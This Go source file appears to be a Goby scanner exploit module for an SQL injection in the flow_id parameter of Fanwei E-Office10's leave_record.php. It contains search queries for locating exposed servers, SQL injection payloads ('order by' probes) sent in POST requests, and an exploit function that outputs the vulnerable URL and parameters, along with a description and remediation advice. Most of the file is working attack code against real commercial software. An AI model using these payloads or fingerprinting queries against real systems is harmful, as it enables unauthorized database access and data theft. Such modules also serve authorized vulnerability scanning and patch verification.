package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
    "strings"
)

func init() {
    expJson := `{
    "Name": "Fanwei E-Office10  flow_id parameter SQL injection vulnerability",
    "Description": "<p>Fanwei E-Office10 is an online office system of Shanghai Fanwei Network Technology Co., Ltd.</p><p>There is a SQL injection vulnerability in the flow_id parameter of leave_record.php in the version before 2022 of Fanwei E-Office10, and attackers can use this vulnerability to cause damage to the system.</p>",
    "Product": "E-Office10",
    "Homepage": "https://www.e-office.cn/",
    "DisclosureDate": "2022-07-18",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\" || body=\"/eoffice10/client\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\" || body=\"/eoffice10/client\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in the flow_id parameter of leave_record.php in the version before 2022 of Fanwei E-Office10, which allows attackers to obtain sensitive database information</p>",
    "Recommendation": "<p>1. The manufacturer has temporarily fixed this vulnerability, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor database operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
    "References": [
        "https://www.e-office.cn/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "url",
            "type": "input",
            "value": "http://{{{hostinfo}}}",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/eoffice10/server/ext/system_support/leave_record.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0x000013",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/eoffice10/server/ext/system_support/leave_record.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "login_user_id=1&flow_id=1' order by 1#&table_field=id&table_field_name=id&max_rows=10"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "未找到相关数据",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/eoffice10/server/ext/system_support/leave_record.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "login_user_id=1&flow_id=1' order by 2#&table_field=id&table_field_name=id&max_rows=10"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0x000013",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/eoffice10/server/ext/system_support/leave_record.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0x000013",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|sub|http://{{{hostinfo}}}//eoffice10/server/ext/system_support/leave_record.php\\r\\nlogin_user_id=1&flow_id=1' order by 2#&table_field=id&table_field_name=id&max_rows=10"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office10 flow_id 参数 SQL 注入漏洞",
            "Product": "泛微E-Office10",
            "Description": "<p>泛微E-Office10是上海泛微网络科技股份有限公司的一套在线办公系统。</p><p>泛微E-Office10的在2022年之前的版本的leave_record.php的flow_id参数存在SQL注入漏洞，攻击者可通该漏洞对系统造成破坏。</p>",
            "Recommendation": "<p>1、厂商暂已修复此漏洞，<span style=\"font-size: 17.5px;\"> </span>请升级至最新版</p><p>2、部署web应用防火墙，对数据库操作进行监控</p><p>3、如非必要，禁止公网访问此系统</p>",
            "Impact": "<p><span style=\"font-size: medium;\"><span style=\"color: rgb(62, 62, 62);\">泛微E-Office10的在2022年之前的版本的</span><span style=\"color: rgb(62, 62, 62);\">leave_record.php</span><span style=\"color: rgb(62, 62, 62);\">的flow_id参数存在SQL注入漏洞</span>，攻击者可以获取数据库敏感信息</span></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Fanwei E-Office10  flow_id parameter SQL injection vulnerability",
            "Product": "E-Office10",
            "Description": "<p>Fanwei E-Office10 is an online office system of Shanghai Fanwei Network Technology Co., Ltd.</p><p>There is a SQL injection vulnerability in the flow_id parameter of leave_record.php in the version before 2022 of Fanwei E-Office10, and attackers can use this vulnerability to cause damage to the system.</p>",
            "Recommendation": "<p>1. The manufacturer has temporarily fixed this vulnerability, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor database operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
            "Impact": "<p>There is a SQL injection vulnerability in the flow_id parameter of leave_record.php in the version before 2022 of Fanwei E-Office10, which allows attackers to obtain sensitive database information<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      url := ss.Params["url"].(string)
      uri := "/eoffice10/server/ext/system_support/leave_record.php"
      cfg := httpclient.NewGetRequestConfig(uri)
      cfg.VerifyTls = false
      if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody,"0x000013") {
        expResult.Success = true
        expResult.Output = "vul_url: "+url+"/eoffice10/server/ext/system_support/leave_record.php\r\npost_params: login_user_id=1&flow_id=1' order by 2#&table_field=id&table_field_name=id&max_rows=10"
      }else{
        expResult.Success = false
        expResult.Output = ""
      }
      return expResult     //输出exp执行结果的格式
    },
    ))
}